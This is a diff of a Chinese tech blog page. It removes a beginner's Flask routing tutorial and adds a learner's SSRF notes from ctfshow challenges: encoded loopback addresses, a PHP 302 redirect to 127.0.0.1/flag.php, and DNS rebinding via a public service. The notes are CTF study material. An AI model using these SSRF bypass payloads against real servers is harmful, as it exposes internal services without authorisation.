class="line">http://0177.0000.0000.0001</span><br><span class="line"></span><br><span class="line">十六进制</span><br><span class="line">http://0x7F.0x00.0x00.0x01</span><br><span class="line"></span><br><span class="line">整数形式</span><br><span class="line">将整个IP地址转换为一个32位无符号整数</span><br><span class="line">127 * 256^3 + 0 * 256^2 + 0 * 256^1 + 1 * 256^0 = 2130706433</span><br><span class="line">http://2130706433</span><br></pre></td></tr></table></figure>
+
+<p>我们在访问时不一定需要把127.0.0.1写全</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.1</span><br><span class="line">127.1</span><br><span class="line">0.0</span><br><span class="line">都可以充当localhost</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们也可以使用域名进行绕过，我收集一些</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"><span class="comment">//相当于以管理员去访问flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>sudo</p>
 <ul>
-<li><strong>from flask import Flask</strong>： 这行代码从 <code>flask</code> 模块中导入了 <code>Flask</code> 类。<code>Flask</code> 类是 Flask 框架的核心，用于创建 Flask 应用程序实例。</li>
-<li>**app &#x3D; Flask(<strong>name</strong>)**： 这行代码创建了一个 Flask 应用实例。<code>__name__</code> 是一个特殊的 Python 变量，它在模块被直接运行时是 <code>&#39;__main__&#39;</code>，在被其他模块导入时是模块的名字。传递 <code>__name__</code> 给 <code>Flask</code> 构造函数允许 Flask 应用找到和加载配置文件。</li>
-<li>**@app.route(‘&#x2F;‘)**： 这是一个装饰器，用于告诉 Flask 哪个 URL 应该触发下面的函数。在这个例子中，它指定了根 URL（即网站的主页）。</li>
-<li>**def hello_world():**： 这是定义了一个名为 <code>hello_world</code> 的函数，它将被调用当用户访问根URL时。</li>
-<li>**return ‘Hello, World!’**： 这行代码是 <code>hello_world</code> 函数的返回值。当用户访问根 URL 时，这个字符串将被发送回用户的浏览器。</li>
-<li>**if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:**：这行代码是一个条件判断，用于检查这个模块是否被直接运行，而不是被其他模块导入。如果是直接运行，下面的代码块将被执行。</li>
-<li>**app.run(debug&#x3D;True)**：这行代码调用 Flask 应用实例的 <code>run</code> 方法，启动 Flask 内置的开发服务器。<code>debug=True</code> 参数会启动调试模式，这意味着应用会在代码改变时自动重新加载，并且在发生错误时提供一个调试器。</li>
+<li>默认情况下，Linux 系统中的超级用户（root）拥有最高权限，可以执行任何操作。</li>
+<li>普通用户的权限有限，无法执行某些系统级操作（如安装软件、修改系统配置等）。</li>
+<li><code>sudo</code> 允许普通用户在需要时临时提升权限，执行需要超级用户权限的命令。</li>
 </ul>
-<h2 id="3-Flask基本概念"><a href="#3-Flask基本概念" class="headerlink" title="3.Flask基本概念"></a>3.Flask基本概念</h2><p>这里主要是了解一些概念，后面会详细的将用法，现在先了解下整体</p>
-<p>以下是 Flask 的主要基本概念的详细解析：</p>
-<ul>
-<li><strong>路由</strong>：路由是 URL 到 Python 函数的映射。Flask 允许你定义路由，这样当特定的 URL 被访问时，就会调用相应的函数。</li>
-<li><strong>视图函数</strong>：视图函数是处理请求并返回响应的 Python 函数。它们通常接收请求对象作为参数，并返回响应对象。</li>
-<li><strong>请求对象</strong>：请求对象包含了客户端发送的请求信息，如请求方法、URL、请求头、表单数据等。</li>
-<li><strong>响应对象</strong>：响应对象包含了发送给客户端的响应信息，如状态码、响应头、响应体等。</li>
-<li><strong>模板</strong>：Flask 使用 Jinja2 模板引擎来渲染 HTML 模板。模板允许你将 Python 代码嵌入到 HTML 中，从而动态生成网页。</li>
-<li><strong>应用工厂</strong>：应用工厂是一个 Python 函数，它创建并返回一个 Flask 应用实例。这允许你配置和初始化你的应用，并且可以创建多个应用实例。</li>
-<li><strong>配置对象</strong>：Flask 应用有一个配置对象，你可以使用它来设置各种配置选项，如数据库连接字符串、调试模式等。</li>
-<li><strong>蓝图</strong>：蓝图是 Flask 中的一个组织代码的方式，它允许你将相关的视图函数、模板和静态文件组织在一起，并且可以在多个应用中重用。</li>
-<li><strong>静态文件</strong>：静态文件是不会被服务器端执行的文件，如 CSS、JavaScript 和图片文件。Flask 提供了一个简单的方法来服务这些文件。</li>
-<li><strong>扩展</strong>：Flask 有许多扩展，可以添加额外的功能，如数据库集成、表单验证、用户认证等。</li>
-<li><strong>会话</strong>：Flask 使用客户端会话来存储用户信息，这允许你在用户浏览你的应用时记住他们的状态。</li>
-<li><strong>错误处理</strong>：Flask 允许你定义错误处理函数，当特定的错误发生时，这些函数会被调用。</li>
-</ul>
-<h2 id="4-Flask路由"><a href="#4-Flask路由" class="headerlink" title="4.Flask路由"></a>4.Flask路由</h2><p>Flask 路由是 Web 应用程序中将 URL 映射到 Python 函数的机制。</p>
-<p>Flask 路由是 Flask 应用的核心部分，用于处理不同 URL 的请求，并将请求的处理委托给相应的视图函数。</p>
-<p>我们通过Flask访问到的各个网页是有路由设定的</p>
-<p>以下是关于 Flask 路由的详细说明，包括路由的定义、参数、方法和规则等。</p>
-<ol>
-<li><strong>定义路由</strong>：使用 <code>@app.route(&#39;/path&#39;)</code> 装饰器定义 URL 和视图函数的映射。</li>
-<li><strong>路由参数</strong>：通过动态部分在 URL 中传递参数。</li>
-<li><strong>路由规则</strong>：使用类型转换器指定 URL 参数的类型。</li>
-<li><strong>请求方法</strong>：指定允许的 HTTP 请求方法。</li>
-<li><strong>路由函数返回</strong>：视图函数可以返回不同类型的响应。</li>
-<li><strong>静态文件和模板</strong>：管理静态文件和动态渲染 HTML 模板。</li>
-<li><strong>路由优先级</strong>：确保路由顺序正确，以避免意外的匹配结果。</li>
-</ol>
-<p><strong>1.定义路由</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#这个app规定模块为自身这个文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="comment">#感觉和index.php差不多</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Welcome to the Home Page!&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-302重定向绕过"><a href="#2-302重定向绕过" class="headerlink" title="2.302重定向绕过"></a>2.302重定向绕过</h3><p>听力别人在那讲，好像有点懂了又好像并没有。但大概意思懂了。</p>
+<p>当目标服务器后端对我们输入的IP地址过滤掉内网ip的时候，我们就无法直接访问到127.0.0.1这个ip了，但是我们可以通过间接访问ip实现重定向访问</p>
+<p>我们可以在云服务器上部署这个php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">//实现跳转服务器本地ip          </span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><code>@app.route(&#39;/&#39;)</code>：装饰器，用于定义路由。<code>/</code> 表示根 URL。</li>
-<li><code>def home()</code>：视图函数，当访问根 URL 时，返回 <code>&#39;Welcome to the Home Page!&#39;</code>。</li>
-</ul>
-<p><strong>2.路由参数</strong></p>
-<p>路由可以包含动态部分，通过在路由中指定参数，可以将 URL 中的部分数据传递给视图函数。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Hello, <span class="subst">&#123;name&#125;</span>!&#x27;</span></span><br><span class="line"><span class="comment">#f 是用来标识这是一个 f-string（格式化字符串字面值）的</span></span><br></pre></td></tr></table></figure>
+<p>通过访问我的云服务器实现跳转到flag.php，但我不知道为什么ctfshow上面不行，是flag.php里面没有直接放flag吗，但是自己用浏览器和其他靶场就可以</p>
+<img src="/2025/03/17/SSRF/image-20250320204410238.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250320204410238.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250320204410238">
 
-<p>这个代码将&lt;name&gt;作为参数，会输出Hello，&lt;name&gt;</p>
-<p>效果如下</p>
-<img src="/2025/03/16/Flask/image-20250316160814118.png" class="lazyload" data-srcset="/2025/03/16/Flask/image-20250316160814118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250316160814118">
+<p>不知道为什么又可以用了</p>
+<img src="/2025/03/17/SSRF/image-20250320212635563.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250320212635563.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250320212635563">
 
-<p>需要注意的是，这虽然和GET请求一样通过url传递参数，但是区别在于这个根据视图函数规定只能传递一个，而且没问号。而GET请求则没有限制随便传，也有问号</p>
-<p><strong>3.路由规划</strong></p>
-<p>路由规则支持不同类型的参数和匹配规则。</p>
-<p>类型规则：</p>
-<ul>
-<li><strong>字符串（默认）：</strong> 匹配任意字符串。</li>
-<li><strong>整数（<code>&lt;int:name&gt;</code>）：</strong> 匹配整数值。</li>
-<li><strong>浮点数（<code>&lt;float:value&gt;</code>）：</strong> 匹配浮点数值。</li>
-<li><strong>路径（<code>&lt;path:name&gt;</code>）：</strong> 匹配任意字符，包括斜杠 <code>/</code>。</li>
-</ul>
-<p>实例;</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_profile</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;User ID: <span class="subst">&#123;user_id&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/files/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Serving file: <span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-DNS解析绕过"><a href="#3-DNS解析绕过" class="headerlink" title="3.DNS解析绕过"></a>3.DNS解析绕过</h3><p>这个有点难，听力几次也没明白，总之先把胜利结算画面贴出来</p>
+<img src="/2025/03/17/SSRF/image-20250320212850777.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250320212850777.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250320212850777">
 
-<p>这个就是对传入参数有一定限制，规定一下类型</p>
-<p><strong>4.请求方法</strong></p>
-<p>Flask 路由支持不同的 HTTP 请求方法，如 GET、POST、PUT、DELETE 等。可以通过 methods 参数指定允许的请求方法。</p>
-<p>实例:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_params&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>():</span><br><span class="line">    <span class="comment"># 获取单个参数</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="comment"># 如果参数不存在，get 方法会返回 None，也可以指定默认值</span></span><br><span class="line">    city = request.args.get(<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>, City: <span class="subst">&#123;city&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>这都得益于一个函数</p>
+<p><strong>gethostbyname()</strong></p>
+<p>这个函数把我们提供的域名解析为ipv4的地址，应该就是他们常说的dns解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p> 代码解释</p>
-<ul>
-<li><code>request.args</code> 是一个类似字典的对象，用于存储 URL 查询字符串中的参数。</li>
-<li><code>request.args.get(&#39;name&#39;)</code> 用于获取名为 <code>name</code> 的参数值，如果该参数不存在，返回 <code>None</code>。</li>
-<li><code>request.args.get(&#39;city&#39;, &#39;Unknown&#39;)</code> 表示如果 <code>city</code> 参数不存在，将返回默认值 <code>&#39;Unknown&#39;</code>。</li>
-</ul>
-<p>这是通过GET请求获得参数。至于POST请求</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/post_form&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_form</span>():</span><br><span class="line">    <span class="comment"># 获取单个参数</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    age = request.form.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    city = request.form.get(<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>, City: <span class="subst">&#123;city&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>这个代码拿到我们的域名并解析为ipv4，然后对我们的ip地址进行一个过滤，必须为公网ip，我们想访问127.0.0.1就需要进行一项操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lock.cmpxchg8b.com/rebinder.html</span><br></pre></td></tr></table></figure>
 
-<p>无法通过url获得参数。直接访问会出现下面这样，其他方法还难一点</p>
-<img src="/2025/03/16/Flask/image-20250316162224430.png" class="lazyload" data-srcset="/2025/03/16/Flask/image-20250316162224430.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250316162224430">
-
-<p>这是GET请求</p>
-<img src="/2025/03/16/Flask/image-20250316162554789.png" class="lazyload" data-srcset="/2025/03/16/Flask/image-20250316162554789.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250316162554789">
+<p>这个网站可以将我们提供的两个ip生成一个混合域名，当我们使用gethostbyname()进行解析的时候会随机返回两个ip中的一个，我们使用</p>
+<img src="/2025/03/17/SSRF/image-20250320213707719.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250320213707719.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250320213707719">
 
 
 
-<p><strong>5.路由转换器</strong></p>
-<p>Flask 提供了一些内置的转换器，可以对 URL 中的参数进行特定类型的转换。</p>
-<p>常用转换器：</p>
-<ul>
-<li><strong><code>int</code>：</strong> 匹配整数。</li>
-<li><strong><code>float</code>：</strong> 匹配浮点数。</li>
-<li><strong><code>path</code>：</strong> 匹配任意路径，包括斜杠。</li>
-</ul>
-<p>话说这个也是相当于对参数的强制类型转换，为什么不放在路由规划前面讲</p>
-<p>实例：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/items/&lt;int:item_id&gt;/details&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">item_details</span>(<span class="params">item_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Item details for item ID: <span class="subst">&#123;item_id&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>下面的内容有点很重要，我似乎有点明白了</p>
+<img src="/2025/03/17/SSRF/image-20250320214015123.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250320214015123.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250320214015123">
 
-<ul>
-<li><code>&lt;int:item_id&gt;</code>：将 URL 中的 <code>item_id</code> 转换为整数。</li>
-</ul>
-<p><strong>6.路由函数返回</strong></p>
-<p>视图函数可以返回多种类型的响应：</p>
-<ul>
-<li><strong>字符串</strong>：返回纯文本响应。</li>
-<li><strong>HTML</strong>：返回 HTML 页面。</li>
-<li><strong>JSON</strong>：返回 JSON 数据。</li>
-<li><strong>Response 对象</strong>：自定义响应</li>
-</ul>
-<p>实例:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify, Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/json&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_response</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/custom&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_response</span>():</span><br><span class="line">    response = Response(<span class="string">&#x27;Custom response with headers&#x27;</span>, status=<span class="number">200</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Custom-Header&#x27;</span>] = <span class="string">&#x27;Value&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p>我们先看这张图和代码，</p>
+<p>其实当我们去访问域名的url的时候也需要进行一次dns解析，那么整个过程我们就进行了两次dns解析，第一次是拿到解析ipv4去进行过滤的时候，第二次是过滤过了，然后访问url的时候进行的dns解析，</p>
+<p>而我们拿到flag的条件就是第一次dns解析为我们的公网ip，第二次访问时进行dns解析时解析为127.0.0.1，使我们访问flag.php。这也是为什么需要进行多次提交payload才能拿到flag</p>
+<h2 id="5-ctfshow"><a href="#5-ctfshow" class="headerlink" title="5.ctfshow"></a>5.ctfshow</h2><p>还是得做题，不然不知道干什么。</p>
+<h3 id="1-352关"><a href="#1-352关" class="headerlink" title="1.352关"></a>1.352关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="comment">//过滤掉127.0.0.1</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//启动会话，并返回句柄</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//相当于服务器访问传入url</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//关闭会话   </span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><code>jsonify(data)</code>：将字典转换为 JSON 响应。</li>
-<li><code>Response(&#39;Custom response with headers&#39;, status=200)</code>：创建自定义响应对象。</li>
-</ul>
-<p><strong>静态文件和模板</strong></p>
-<p>我们之前有这么一串代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
+<p><strong>parse_url()</strong></p>
+<p>作用：parse_url — 解析 URL，返回其组成部分</p>
+<p>mixed parse_url ( string $url [, int $component &#x3D; -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p>
+<p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p>
+<p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p>
+<p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line"><span class="comment">//就是把url的各个属性给拆开</span></span><br></pre></td></tr></table></figure>
 
